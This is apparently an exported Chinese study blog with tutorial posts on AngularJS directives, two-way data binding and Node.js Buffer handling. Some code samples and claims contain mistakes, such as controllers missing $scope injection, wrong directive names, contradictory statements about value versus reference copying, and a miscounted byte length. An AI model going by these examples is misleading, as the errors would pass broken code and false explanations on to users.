出现这种现象的原因是，内置指令ng-model在它自身内部的隔离作用域和DOM的作用域之间创建了一个双向数据绑定。让我们来模仿一下这个设置过程以使例子能正常工作，我们的目标是理解双向数据绑定，以及ng-model在这个过程中的行为。双向数据绑定或许是angularjs中最重要且无法通过jQuery简单实现的功能之一。我们需要自己实现它进而了解它的神奇效果，接下来我们的隔离作用域ng-model内部的隔离作用域之间创建一个双向数据绑定，这样我们的例子就完整了。将内部的$scope.myUrl属性同当前控制器作用域中的theirUrl属性进行绑定，在DOM中通过作用域查询来实现这个绑定。在这个流程中，给两个方向的绑定都添加一个文本输入字段，通过这两个输入字段可以方便地观察作用域是如何在DOM中通过原型继承链接在一起的:123456789101112131415&lt;label&gt;Their URL field:&lt;/label&gt;&lt;input type="text" ng-model="theirUrl"&gt;&lt;div my-directive some-attr="theirUrl" my-link-text="Click me go to baidu"&gt;&lt;/div&gt;angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'A', replace:true, scope:&#123; myUrl:'=someAttr',//经过了修改 myLinkText:'@'&#125;, template:'&lt;div&gt;&lt;label&gt;My Url Field:&lt;/label&gt;&lt;input type="text" ng-model="myUrl"/&gt;&lt;a href="&#123;&#123;myUrl&#125;&#125;"&gt;&#123;&#123;myLinkText&#125;&#125;&lt;/a&gt;&lt;/div&gt;&#125;;&#125;); 唯一修改的使用=绑定策略代替了@。总地来说，这个例子展示了双向数据绑定的神奇效果，它是angularjs的主要卖点之一。了解内部指令的工作原理非常重要，这样才能在同自定义指令一起使用时把他们的行为考虑在内。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs之内置指令]]></title>
    <url>%2F2017%2F03%2F09%2Fsecond%2F</url>
    <content type="text"><![CDATA[ng属性指令 ng-href ng-src ng-disabled ng-checked ng-readonly ng-selected ng-class ng-style 布尔属性布尔属性代表一个true或false值。当这个属性出现时，这个属性的值就是true，如果未出现，这个属性就是false。当在angularjs中使用动态数据绑定时，不能简单地将这个属性值设置为true或false,因为根据标准定义只有当这个属性不出现时，它的值才为false。因此angularjs提供了一组带有ng-前缀版本的布尔属性，通过运算表达式的值来决定在目标元素上是插入还是移除对应的属性。 ng-disabled使用ng-disabled可以把disabled属性绑定到一下表单输入字段上:1234&lt;input&gt;(text,checkbox,radio,number,url,email,submit)&lt;textarea&gt;&lt;select&gt;&lt;button&gt; 当写普通的HTML输入字段时，如果在元素标签上出现了disabled属性就会禁用这个输入字段。通过ng-disabled可以对是否出现属性进行绑定。例如，在下面的例子中按你会一直被禁用，知道用户在文本字段中输入内容:12&lt;input type="text" ng-model="someProperty" placeholder="TypetoEnable"&gt;&lt;button ng-model="button" ng-disabled="!someProperty"&gt;AButton&lt;/button&gt; 在下面的例子，文本字段会被禁用五秒，知道在\$timeout中将isDisabled属性设置为true:12345678&lt;textarea ng-disabled="isDisabled"&gt;Wait5seconds&lt;/textarea&gt;angular.module('myApp',[]).run(function($rootScope,$timeout)&#123; $rootScope.isDisabled=true; $timeout(function()&#123; $rootScope.isDisabled = false;&#125;,5000)&#125;); ng-readonly同其他布尔属性一样，HTML定义只会检查readonly属性是否出现，而不是他的实际值。通过ng-readonly,可以将某个返回真或假的表达式同是否出现readonly属性进行绑定在,作用是是否只读: 12&lt;input type="text" ng-model="someProperty"&gt;&lt;br/&gt;&lt;input type="text" ng-readonly="someProperty" value="some text here"/&gt; ng-checked标准的checked属性是一个布尔属性，不需要进行赋值，通过ng-checked将某个表达式同是否出现checked属性进行绑定在下面的例子中，我们通过ng-init指令将someProperty的值设置为true。将some Property同ng-checked绑定在一起，angularjs会输出标准的HTML checked属性，这样默认会把复选框勾选: 12&lt;label&gt;someProperty=&#123;&#123;someProperty&#125;&#125;&lt;/label&gt;&lt;input type="checkbox" ng-checked="someProperty" ng-init="someProperty=true" ng-model="someProperty"&gt; 下面的例子刚好相反:12&lt;label&gt;someProperty = &#123;&#123;anotherProperty&#125;&#125;&lt;/label&gt;&lt;input type="checkbox" ng-checked="anotherProperty" ng-init="anotherProperty=false" ng-model="anotherProperty"&gt; 注意，为了展示，这里用ng-model把someProperty和anotherProperty的值绑定到了对应的标签里。 ng-selectedng-selected可以对是否出现option标签的selected属性进行绑定:123456&lt;label&gt;Select Two Fish:&lt;/label&gt;&lt;input type="checkbox" ng-model="isTwoFish"&gt;&lt;br/&gt;&lt;select&gt;&lt;option&gt;One Fish&lt;/option&gt;&lt;option ng-selected="isTwoFish"&gt;Two Fish&lt;/option&gt;&lt;/select&gt; 类布尔属性ng-href、ng-src等属性虽然不是标准的HTML布尔属性，但是由于行为相似，所以在angularjs源码内都是和布尔属性同等对待的。 ng-href当使用当前作用域中的属性动态创建URL时，应该用ng-href代替href。这里的潜在问题是当用户点击一个由插值动态生成的链接时，如果插值尚未生效，将会跳转到错误的页面。这时，如果使用ng-href,angularjs会等到插值生效后再执行点击链接的行为:1234&lt;!-- 当href包含一个&#123;&#123;expression&#125;&#125;时总是使用ng-href --&gt;&lt;a ng-href="&#123;&#123;myHref&#125;&#125;"&gt;I`m feeling lucky,when i load&lt;/a&gt;&lt;!-- 用户单击之前，hrefe不会加载--&gt;&lt;a href="&#123;&#123;myHref&#125;&#125;"&gt;I`m feeling 404&lt;/a&gt; 将插值生效的事件延迟两秒，来观察实际的行为:123456angular.module('myApp',[]).run(function($rootScope,$timeout)&#123; $timeout(function()&#123; $rootScope.myHref="http://www.baidu.com";&#125;,2000);&#125;); ng-srcangularjs会告诉浏览器在ng-src对应的表达式生效之前不要加载图像:12345678910&lt;h1&gt;wrongway&lt;/h1&gt;&lt;img src="&#123;&#123;imgSrc&#125;&#125;"/&gt;&lt;h1&gt;Rightway&lt;/h1&gt;&lt;img ng-src="&#123;&#123;imgSrc&#125;&#125;"/&gt;angular.module('myApp',[]).run(function($rootScope,$timeout)&#123; $timeout(function()&#123; $rootScope.imgSrc='https://www.google.com/images/srpr/logo11w.png';&#125;,2000); &#125;); 在指令中使用子作用域下面将要介绍的指令会以父级作用域为原型生成子作用域。这种继承的机制可以创建一个隔离层，用来将需要协同工作的方法和数据模型对象放置在一起。ng-app和ng-controller是特殊的指令，因为它们会修改嵌套在它们内部的指令的作用域。ng-app为angularjs应用创建\$rootScope,ng-controller则会以\$rootScope或另外一个ng-controller的作用域为原型创建新的子作用域。 ng-app任何具有ng-app属性的DOM元素将被标记为\$rootScope的起始点。$rootScope是作用域链的起始点，任何嵌套在ng-app内的指令都会继承它。在JavaScript代码中通过run方法来访问\$rootScope。 12345678910111213&lt;html ng-app="myApp"&gt;&lt;body&gt;&#123;&#123;someProperty&#125;&#125;&lt;button ng-click="someAction()"&gt;&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;angular.module('myApp',[]).run(function($rootScope)&#123; $rootScope.someProperty = 'hello computer'; $rootScope.someAction = function()&#123; $rootScope.someProperty = 'hello numan';&#125;;&#125;); ng-controller内置指令ng-controller的作用是为嵌套在其中的指令创建一个子作用域，避免将所有操作和模型都定义在\$rootScope上。用这个指令可以在一个DOM元素上放置控制器。ng-controller接受一个参数expression,这个参数是必需的。expression参数是一个angularjs表达式。子\$scope只是一个JavaScript对象，其中含有从父级\$scope中通过原型继承得到的方法和属性，包括应用的\$rootScope.嵌套在ng-controller中的指令有访问新子\$scope的权限，但是要牢记每个指令都应该遵守的和作用域相关的规则。\$scope对象的职责是承载DOM中指令所共享的操作和模型。操作指的是\$scope上标准的JavaScript方法，模型指的是\$scope上保存的包含瞬时状态数据的JavaScript对象。持久化状态的数据应该保存到服务器中，服务的作用是处理模型的持久化。控制器应用 1234567891011121314151617181920212223&lt;div ng-controller="someController"&gt;&#123;&#123;someBareValue&#125;&#125;&lt;button ng-click="someAction()"&gt;Communicate to child&lt;/button&gt;&lt;div ng-controller="childController"&gt;&#123;&#123;someBareValue&#125;&#125;&lt;button ng-click = "childAction()"&gt;Communicate to parent&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;angular.module('myApp',[]).controller('SomeController',function($scope)&#123; //反模式，裸值 $scope.someBareValue = 'hello computer'; //设置 $scope 本身的操作，这样没问题 $scope.someAction = function()&#123; //在someBareValue = 'hello numan,from parent';&#125;;.controller('ChildController',function($scope)&#123; $scope.childAction = function()&#123; //在ChildController中设置&#123;&#123;someBareValue&#125;&#125; $scope.someBareValue = 'hello numan,from child';&#125;&#125;&#125;); 由于原型继承的关系，修改父级对象中的someBareValue会同时修改子对象中的值，但反之则不行。可以看下这个例子的实际效果，首先点击childButton，然后点击parentButton,这个例子充分说明了子控制器是复制而非引用someBareValue。JavaScript对象要么是值复制要么是引用复制。字符串、数组和布尔型变量是值复制。数组、对象和函数则是引用复制。如果将模型对象的某个属性设置为字符串，他会通过引用进行共享，因此在子$scope中修改属性也会修改父\$scope中的这个属性。下面的例子展示了正确的做法:1234567891011121314151617181920212223&lt;div ng-controller="someController"&gt; &#123;&#123;someModel.somevalue&#125;&#125; &lt;button ng-click="someAction()"&gt; Communicate to child&lt;/button&gt; &lt;div ng-controller="ChildController"&gt; &#123;&#123;someModel.somevalue&#125;&#125; &lt;button ng-click = "childAction()"&gt;Communicate to parent&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; angular.module('myApp',[]) .controller('SomeController',function()&#123; //最佳实践，永远用一个模式 $scope.someModel=&#123; someValue : 'hello coputer' &#125; $scope.someAction = function()&#123; $scope.someModel.someValue = 'hello human,from parent'; &#125;; &#125;) .controller('ChildController',function($scope)&#123; $scope.childAction = function()&#123; $scope.someModel.someValue = 'hello human,from child'; &#125; &#125;) 无论点击哪个按钮，值都会进行同步修改。注意，虽然这个特性是实用ng-controller时最重要的特性之一，但在实用任何会创建子作用域的指令时，如果将指令定义中的scope设置为true，这个特性也会带来负面影响。下面的内置指令都有同样的特性:ng-include,ng-switch,ng-repeat,ng-view,ng-controller,ng-if. ng-include实用ng-include可以加载、编译包含外部HTML片段到当前的应用中。模板的URL被限制在与应用文档相同的域和协议下，可以通过白名单或包装成被信任的值来突破限制。更进一步，需要考虑跨域资源共享和同源规则来确保模板可以在任何浏览器中正常加载。例如，所有浏览器都不能进行跨域的请求，部分浏览器也不能访问file://协议的资源。在同一个元素上添加onload属性可以在模板加载完后执行一个表达式。要记住，使用ng-include时angularjs会自动创建子作用域。如果你想使用某个特定的作用域，例如ControllerA的作用域，必须在同一个DOM元素上添加ng-controller=”ControllerA”指令，这样当模板加载完成后，不会像往常一样从外部作用域继承并创建一个新的子作用域。 示例:123&lt;div ng-include="/myTemplateName.html" ng-controller="MyController" ng-init="name='world'"&gt;Hello &#123;&#123;name&#125;&#125;&lt;/div&gt; ng-switch这个指令和ng-switch-when及on=”propertyName”一起使用，可以在propertyName发生变化时渲染不同指令到视图中。在下面例子中，当person.name是Ari时，文本域下面的div会显示，并且这个人会获得胜利: 12345&lt;input type="text" ng-model="person.name"/&gt;&lt;div ng-switch on="person.name"&gt; &lt;p ng-switch-default&gt; And the winner is&lt;/p&gt; &lt;h1 ng-switch-when="Ari"&gt;&#123;&#123;person.name&#125;&#125;&lt;/h1&gt;&lt;/div&gt; 注意，在switch被调用之前我们用ng-switch-default来输出默认值。 ng-repeat ng-repeat用来遍历一个集合或为集合中的每个元素生成一个模板实例。集合中的每个元素都会被赋予自己的模板和作用域。同时每个模板实例的作用域中都会暴露一些特殊的属性。\$index:遍历的进度。\$first:当元素是遍历的第一个时值为true。\$middle:当元素处于第一个和最后元素之间时值为true。\$last:当元素是遍历的最后一个时值为true。\$even:当\$index值时偶数时值为true。\$odd:当\$index值是奇数时值为true。下面的例子展示了如何用\$odd和\$even来制作一个红蓝相间的列表。记住，JavaScript中数组的索引从0开始，因此我们用!$even和!$odd来将\$even和\$odd的布尔值反转。 123456789101112131415161718&lt;ul ng-controller="PeopleController"&gt; &lt;li ng-repeat="person in people" ng-class="&#123;even:!$even,odd:!$odd&#125;"&gt; &#123;&#123;person.name&#125;&#125; lives in &#123;&#123;person.city&#125;&#125; &lt;/li&gt;&lt;/ul&gt;.odd&#123; background-color:blue;&#125;.even&#123; background-color:red;&#125;angular.module('myApp',[]).controller('PeopleController',function()&#123; $scope.people=[ &#123;name:"Ari",city:"San Francisco"&#125;, &#123;name:"Erik",city:"Seattle"&#125;];&#125;); ng-viewng-view指令用来设置将被路由管理和放置在HTML中的视图的位置。 ng-controller ng-if使用ng-if指令可以完全根据表达式的值在DOM中生成或移除一个元素。如果赋值给ng-if的表达式为false，那对应的元素将会从DOM中移除，否则对应元素的一个克隆将被重新插入DOM中。ng-if同ng-show和ng-hide指令最本质的区别是，它不是通过CSS显示或隐藏DOM节点，而是真正生成或移除节点。当一个元素被ng-if从DOM中移除，同它关联的作用域也会被销毁，而且当它重新加入DOM中时，会通过原型继承从它的父作用域生成一个新的作用域。同时有一个重要的细节需要知道ngIf重新创建元素时用的是它们编译后的状态。如果ng-if内部的代码加载之后被jquery修改过，那么当ng-if的表达式值为false时，这个DOM元素会被移除，表达式再次成为true时这个元素及其内部的子元素会被重新插入DOM，此时这些元素的状态会是它们的原始状态，而不是它们上次被移除时的状态。也就是说无论用jquery的.addClass添加了什么类都不会存在。 123456&lt;div ng-if="2+2===0"&gt; won`t see this DOM node,not even in the source code&lt;/div&gt;&lt;div ng-if="2+2==4"&gt; Hi,I do exist&lt;/div&gt; ng-initng-init指令用来在指令被调用时设置内部作用域的初始状态。ng-init最常见的使用场景是:对于任何需要健壮结构的场景，请在控制器中用数据模型对象来设置状态。 123&lt;div ng-init="greeting='hello';person='world'"&gt;&#123;&#123;greeting&#125;&#125;&#123;&#123;person&#125;&#125;&lt;/div&gt; 双大括号双大括号语法是angularjs内置的模板语法，它会在内部\$scope和视图之间创建绑定。基于这个绑定，只要\$scope发生变化，视图就会随之自动更新。事实上它也是指令，虽然看起来并不像，实际上它是ng-bind的简略形式，用这种形式不需要创建新的元素，因此它常被用在行内文本中。注意，在屏幕可视的区域内使用双大括号会导致页面加载时未渲染的元素发生闪烁，用ng-bind可以避免这个问题。 123&lt;body ng-init="greeting='HelloWorld'"&gt;&#123;&#123;greeting&#125;&#125;&lt;/body&gt; ng-bind尽管可以在视图中使用双大括号模板语法，我们也可以通过ng-bind指令实现同样的行为。 123&lt;bod ng-init="greeting='HelloWorld'"&gt; &lt;p ng-bind="greeting"&gt;&lt;/p&gt;&lt;/bod&gt; ng-cloat除使用ng-bind来避免为渲染元素闪烁，还可以在含有双大括号的元素上使用ng-cloak指令: 123&lt;body ng-init="greeting='Helloworld'"&gt;&lt;p ng-cloak&gt;&#123;&#123;greeting&#125;&#125;&lt;/p&gt;&lt;/body&gt; ng-cloak指令会将内部元素隐藏，直到路由调用对应的页面时才显示出来。 ng-bind-template同ng-bind指令类似，ng-bind-template用来在视图中绑定多个表达式。 12&lt;div ng-bind-template="&#123;&#123;message&#125;&#125;&#123;&#123;name&#125;&#125;"&gt;&lt;/div&gt; ng-modelng-model指令用来将input、select、textarea或自定义表单控件同包含它们的作用域中的属性进行绑定。它可以提供并处理表单验证功能，在元素上设置相关的CSS类(ng-valid、ng-invalid等)，并负责在父表单中注册控件。它将当前作用域中运算表达式的值同给定的元素进行绑定。如果属性并不存在，它会隐式创建并将其添加到当前作用域中。我们应该始终用ngModel来绑定\$scope上一个数据模型内的属性，而不是\$scope上的属性，这可以避免在作用域或后代作用域中发生属性覆盖。 12&lt;input type="text" ng-model="modelName.someProperty"/&gt;上面的例子展示了如何正确地考虑和使用ngModel。 ng-show/ng-hideng-show和ng-hide根据所给表达式的值来显示或隐藏HTML元素。当赋值给ng-show指令的值为false时元素会被隐藏，类似地，当赋值给ng-hide指令的值为true时元素也会被隐藏。元素的显示或隐藏是通过移除或添加ng-hide这个CSS类来实现的。ng-hide类被预先定义在了angularjs的CSS文件中，并且它的display属性的值为none。 123456789101112&lt;div ng-show="2+2==0"&gt;2+2 isn`t 0,don`t show&lt;/div&gt;&lt;div ng-show="2+2==4"&gt;2+2 is 4,do show&lt;/div&gt;&lt;div ng-hide="2+2==3"&gt;2+2 isn`t 3,don`t hide&lt;/div&gt;&lt;div ng-hide="2+2==4"&gt;2+2 is 4,don`t hide&lt;/div&gt; ng-change这个指令会在表单输入发生变化时计算给定表达式的值。因为要处理表单输入，这个指令要和ngModel联合起来使用。 1234567891011&lt;div ng-controller="EquationController"&gt;&lt;input type ="text" ng-model="equation.x" ng-change="change()"/&gt;&lt;code&gt;&#123;&#123;equation.output&#125;&#125;&lt;/code&gt;&lt;/div&gt;angular.module('myApp',[]).controller('EquationController',function($scope)&#123; $scope.equation=&#123;&#125;; $scope.change = function()&#123; $scope.equation.output=parseInt($scope.equation.x)+2;&#125;;&#125;); ng-fromng-from用来在一个表单内部嵌套另一个表单。普通的HTML标签不允许嵌套，但ng-form可以。这意味着内部所有的子表单都合法时，外部的表单才会合法。这对于用ng-repeat动态创建表单是非常有用的。由于不能通过字符插值来给输入元素动态地生成name属性，所以需要将ng-form指令内每组重复的输入字段都包含一个外部表单元素内。下面的CSS类会根据表单的验证状态自动设置: 表单合法时设置ng-valid; 表单不合法时设置ng-invalid; 表单未进行修改时设置ng-pristion; 表单进行过修改时设置ng-dirty;angular不会将表单提交到服务器，除非它指定了action属性。要指定提交表单时调用哪个JavaScript方法，使用下面两个指令中的一个。 ng-submit:在表单元素上使用 ng-click：在第一个按钮或submit类型的输入字段上使用。示例：展示如何通过服务器返回的JSON数据动态生成一个表单。我们用ng-loop来遍历从服务器取回的所有数据。由于不能动态生成name属性，而我们又需要这个属性做验证，所以在循环的过程中会为每一个字段都生成一个新表单。由于angularjs中用来取代的ng-form指令可以嵌套，并且外部表单在所有子表单都合法之前一直处于不合法状态，因此我们可以在动态生成子表单的同时使用表单验证功能。下面先看一下我们硬编码的JSON数据，把他假设成是从服务器返回的。 1234567891011angular.module('myApp',[]).controller('FormController',function($scope)&#123; $scope.fields=[ &#123;placeholder:'Username',isRequired:true&#125;, &#123;placeholder:'Password',isRequired:true&#125;, &#123;placeholder:'Email(optional)',isRequired:false&#125; ]; $scope.submitFrom=function()&#123; alert('it works!'); &#125;;&#125;); 下面用这些数据生成一个有验证功能的动态表单: 12345678910111213141516&lt;form name="signup_form" ng-controller="FormController" ng-submit="submitForm()" novalidate&gt;&lt;div ng-repeat="field in fields" ng-form="signup_form_input"&gt;&lt;input type="text" name="dynamic_input" ng-required="field.isRequired" ng-model="field.name" placeholder="&#123;&#123;field.palceholder&#125;&#125;"/&gt;&lt;div ng-show ="signup_form_input.dynamic_input.$dirty &amp;&amp; signup_form_input.dynamic_input.$invalid"&gt;&lt;span class="error" ng-show="signup_form_input.dynamic_input.$error.required"&gt;The field is required&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;button type="submit" ng-disabled="signup_form.$invalid"&gt;submit All&lt;/button&gt;&lt;/form&gt;input.ng-invalid&#123; border:1px solid red;&#125; ng-clickng-click用来指定一个元素被点击时调用的方法或表达式 1234567891011121314&lt;div ng-controller="CounterController"&gt;&lt;button ng-click="count=count+1" ng-init="count=0"&gt;Increment&lt;/button&gt;count:&#123;&#123;count&#125;&#125;&lt;button ng-click="decrement()"&gt;&lt;/button&gt;&lt;/div&gt;angular.module('myApp',[]).controller('CounterController',function()&#123; $scope.decrement=function()&#123; $scope.count=$scope.count-1;&#125;;&#125;); ng-selectng-select用来将数据同HTML的元素进行绑定。这个指令可以和ng-model以及ng-options指令一同使用，构建精细且表现优良的动态表单。ng-options的值可以是一个内涵表达式，其实这只是一种有趣的说法，简单来说就是它可以接受一个数组或对象，并对它们进行循环，将内部的内容提供给select标签内部的选项。 数组作为数据源用数组中的值做标签用数组中的值作为选中的标签用数组中的值做标签组用数组中的值作为选中的标签组 对象作为数据源用对象的键值做标签用对象的键值作为选中的标签用对象的键值作为标签组用对象的键值作为选中的标签组示例: 12345678910111213141516&lt;div ng-controller="CityController"&gt;&lt;select ng-model="city" ng-option="city.name for city in cities"&gt;&lt;option value=""&gt;Choose City&lt;/option&gt;&lt;/select&gt;Best City:&#123;&#123;city.name&#125;&#125;&lt;/div&gt;angular.module('myApp',[]).controller('CityController',function($scope)&#123; $scope.cities = [ &#123;name:'Seattle'&#125;, &#123;name:'San Francisco'&#125;, &#123;name:'Chicago'&#125;, &#123;name:'New York'&#125;, &#123;name:'Boston'&#125; ];&#125;); ng-submitng-submit 用来表达式同onsubmit时间进行绑定。这个指令同时会阻止默认行为(发送请求并重新加载页面),除非表单不含有action属性。示例: 1234567891011121314151617181920&lt;form ng-submit="submit()" ng-controller="FormController"&gt;Enter text and hit enter:&lt;input type="text" ng-model="person.name" name="person.name"/&gt;&lt;input type="submit" name="person.name" value="Submit"/&gt;&lt;code&gt;people=&#123;&#123;people&#125;&#125;&lt;/code&gt;&lt;ul ng-repeat="(index,object) in people"&gt;&lt;li&gt;&#123;&#123;object.name&#125;&#125;&lt;/li&gt;&lt;/ul&gt;&lt;/form&gt;angular.module('myApp',[]).controller('FormController',function($scope)&#123; $scope.person=&#123;name:null&#125;; $scope.people=[]; $scope.submit=function()&#123; if($scope.person.name)&#123; $scope.people.push(&#123;name:$scope.person.name&#125;); $scope.person.name='';&#125;&#125;;&#125;); ng-class使用ng-class动态设置元素的类，方法是绑定一个代表所有需要添加的类的表达式。重复的类不会添加。当表达式发生变化，先前添加的类会被移除，新类会被添加。下面的例子会用ng-class在一个随机数大于5时将.red类添加到一个div上: 123456789101112131415161718&lt;div ng-controller="LotteryController"&gt;&lt;div ng-class="&#123;red:x&gt;5&#125;" ng-if="x&gt;0"&gt;You won!&lt;/div&gt;&lt;button ng-click="x=generateNumber()" ng-init="x=0"&gt;Draw Number&lt;/button&gt;&lt;p&gt;Number is: &#123;&#123;x&#125;&#125;&lt;/p&gt;&lt;/div&gt;.red &#123; background-color:red;&#125;angular.module('myApp',[]).controller('LotteryController',function($scope)&#123; $scope.generateNumber = function()&#123; return Math.floor((Math.random()*10)+1);&#125;;&#125;); ng-attr-(suffix)当angularjs编译DOM时会查找两个花括号some expression内的表达式。这些表达式会被自动注册到\$watch服务中并更新到\$digest循环中，成为它的一部分: 1234&lt;h1&gt; Hello &#123;&#123;someExpression&#125;&#125;&lt;/h1&gt;&lt;svg&gt;&lt;circle cx="&#123;&#123;cx&#125;&#125;"&gt;&lt;/circle&gt;&lt;/svg&gt; 运行上面的代码会抛出一个错误，指出我们有一个属性。可以用ng-attr-cx来解决这个问题。注意，cx位于这个名称的尾部。在这个属性中，通过用双大括号来写表达式，达到前面提到的目的。 123&lt;svg&gt;&lt;circle ng-attr-cx="&#123;&#123;cx&#125;&#125;"&gt;&lt;/circle&gt;&lt;/svg&gt;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJs之Buffer处理二进制流]]></title>
    <url>%2F2017%2F03%2F08%2Ffirst%2F</url>
    <content type="text"><![CDATA[buffer简介nodejs引入bufferAPI使其可以在TCP流和文件系统操作等场景中处理二进制数据流。buffer的大小在其创建时就已确定，且不能调整大小。buffer类在nodejs中是一个全局变量，因此无需require(‘buffer’)123456789101112131415//创建一个长度为10、且用0填充的Bufferconst buf1 = Buffer.alloc(10);//创建一个长度为10、且用0x1填充的Buffer。const buf2 = Buffer.alloc(10,1);//创建一个长度为10、且未初始化的Buffer。//这个方法比调用Buffer.alloc()更快，//但返回的Buffer实例可能包含旧数据，//因此需要使用fill()或write()重写。const buf3 = Buffer.allocUnsafe(10);//创建一个包含[0x1,0x2,0x3]的Buffer。const buf4 = Buffer.from([1,2,3]);//创建一个包含ASCII字节数组[0x74,0x65,0x73,0x74]的Buffer。const buf5 = Buffer.from('test');//创建一个包含UTF-8字节数组[0x74,0xc3,0xa9,0x73,0x74]的Bufferconst buf6 = Buffer.from('test','utf8'); Buffer常用API Buffer.from(array)返回一个新建的包含所提供的字节数组的副本的Buffer Buffer.from(arrayBuffer[,byteOffset[,length]])返回一个新建的与给定的ArrayBuffer共享一内存的Buffer。 Buffer.from(buffer)返回一个新建的包含所提供的buffer的内容的副本的buffer。 Buffer.from(string[,encoding])返回一个新建的包含所提供的字符串的副本buffer. Buffer.alloc(size[,fill[,encoding]])返回一个指定的大小的被填满的Buffer实例，这个方法会明显地比Buffer.allocUnsafe(size) 慢，但可确保新创建的 Buffer 实例绝不会包含旧的和潜在的敏感数据。 Buffer.allocUnsafe(size)与Buffer.allocUnsafeSlow(size)返回一个新建的指定 size 的 Buffer，但它的内容必须被初始化，可以使用 buf.fill(0) 或完全写满。 是什么令Buffer.allocUnsafe()和Buffer.alloUnsafeSlow()不安全当调用 Buffer.allocUnsafe() 和 Buffer.allocUnsafeSlow() 时，被分配的内存段是未初始化的（没有用 0 填充）。 虽然这样的设计使得内存的分配非常快，但已分配的内存段可能包含潜在的敏感旧数据。 使用通过 Buffer.allocUnsafe() 创建的没有被完全重写内存的 Buffer ，在 Buffer 内存可读的情况下，可能泄露它的旧数据。 Buffer与字符编码Buffer 实例一般用于表示编码字符的序列，比如 UTF-8 、 UCS2 、 Base64 、或十六进制编码的数据。 通过使用显式的字符编码，就可以在 Buffer 实例与普通的 JavaScript 字符串之间进行相互转换。12345const buf = Buffer.from('hello world','ascii');//输出68656c6c6f20776f726c64console.log(buf.toString('hex'));//输出aGVsbG8gd29ybGQ=console.log(buf.toString('base64')); nodejs目前支持的字符编码包括: ‘ascii’ - 仅支持 7 位 ASCII 数据。如果设置去掉高位的话，这种编码是非常快的。 ‘utf8’ - 多字节编码的 Unicode 字符。许多网页和其他文档格式都使用 UTF-8 。 ‘utf16le’ - 2 或 4 个字节，小字节序编码的 Unicode 字符。支持代理对（U+10000 至 U+10FFFF）。 ‘base64’ - Base64 编码。当从字符串创建 Buffer 时，按照 RFC4648 第 5 章的规定，这种编码也将正确地接受“URL 与文件名安全字母表”。 ‘latin1’ - 一种把 Buffer 编码成一字节编码的字符串的方式（由 IANA 定义在 RFC1345 第 63 页，用作 Latin-1 补充块与 C0/C1 控制码）。 ‘hex’ - 将每个字节编码为两个十六进制字符。 Buffer与TypedArrayBuffer实例也是Unit8Array实例，但是与ECMAScript 2015 中的 TypedArray 规范还是有些微妙的不同。例如，当 ArrayBuffer#slice() 创建一个切片的副本时，Buffer#slice() 的实现是在现有的 Buffer 上不经过拷贝直接进行创建，这也使得 Buffer#slice() 更高效。遵循以下注意事项，也可以从一个Buffer创建一个新的TypedArray实例: Buffer对象的内存是拷贝到typedarray的，而不是共享的。 Buffer对象的内存是被解析为一个明确元素的数组，而不是一个目标类型的字节数组。也就是说，new Uint32Array(Buffer.from([1, 2, 3, 4])) 会创建一个包含 [1, 2, 3, 4] 四个元素的 Uint32Array，而不是一个只包含一个元素 [0x1020304] 或 [0x4030201] 的 Uint32Array 。也可以通过 TypeArray 对象的 .buffer 属性创建一个新建的且与 TypedArray 实例共享同一分配内存的 Buffer 。12345678910111213141516const arr = new Unit16Array(2);arr[0] = 5000;arr[1] = 4000;//拷贝'arr'的内容const buf1 = Buffer.from(arr)//与'arr'共享内存const buf2 = Buffer.from(arr.buffer);//输出:&lt;Buffer 88 a0&gt;console.log(buf1);//输出:&lt;Buffer 88 13 a0 0f&gt;console.log(buf2);arr[1] = 6000;//输出:&lt;Buffer 88 a0&gt;console.log(buf1);//输出：&lt;Buffer 88 13 70 17&gt;console.log(buf2); 当使用 TypedArray 的 .buffer 创建 Buffer 时，也可以通过传入 byteOffset 和 length 参数只使用 ArrayBuffer 的一部分。1234const arr = new Uint16Array(20);const buf = Buffer.from(arr.buffer,0,16);//输出: 16console.log(buf.length); Buffer.from() 和 TypedArray.from() 有着不同的签名与实现。 具体而言，TypedArray 的变种接受第二个参数，在类型数组的每个元素上调用一次映射函数：TypedArray.from(source[,mapFn[,thisArg]])Buffer.from()方法不支持使用映射函数:Buffer.from(array)Buffer.from(buffer)Buffer.from(arrayBuffer[,byteOfferset[,length]])Buffer.from(string[,encoding]) Buffer与ES6迭代器Buffer 实例可以使用 ECMAScript 2015 (ES6) 的 for..of 语法进行遍历。12345678const buf = Buffer.from([1,2,3]);//输出：// 1// 2// 3for(var b of buf)&#123; console.log(b);&#125; 此外，buf.values(),buf.keys()和buf.entries()方法可用于创建迭代器。 buffer应用前面基本上说的是buffer的拼接和内存这两方面的。比如我们使用fs模块来读取文件内容的时候，返回的就是一个Buffer：123fs.readFile('filename',function(err,buf)&#123; //&lt;Buffer 2f 2a 2a 0a 20 2a 20 53 75 ...&gt;&#125;); 在使用net或http模块来接收网络数据时，data时间的参数也是一个Buffer，这时我们还需要使用Buffer.concat()来做数据拼接:1234567var bufs = [];conn.on('data',function(buf)&#123; bufs.push(buf);&#125;);conn.on('end',function()&#123; var buf = Buffer.concat(bufs);&#125;); 还可以利用Buffer.toString()来做转换base64或十六进制字符的转换，比如：12345678console.log(new Buffer('hello,world!').toString('base64'));//转换成base64字符串: aGVsbG8sIHdvcmxkIQ==console.log(new Buffer('aGVsbG8sIHdvcmxkIQ==','base64').toString());//还原base64字符串: hello,world!console.log(new Buffer('hello,world!').toString('hex');// 转换成十六进制字符串：68656c6c6f2c20776f726c6421console.log(new Buffer('68656c6c6f2c20776f726c6421','hex').toString();//还原十六进制字符串:hello,world! 这些API为在Node.js中操作数据提供了极大的便利。假设我们要将一个整形数值存储到文件中，比如当前时间戳为1447656645380，如果将其当作一个字符串存储时，需要占用11字节的空间，而将其转换为二进制存储时仅需6字节空间即可：12345var buff = new Buffer(6);buf.writeUIntBE(1447656645380, 0, 6);// &lt;Buffer 01 51 0f 0f 63 04&gt;buf.readUIntBE(0, 6);// 1447656645380 操作结构化数据的例子]]></content>
      <categories>
        <category>NodeJs</category>
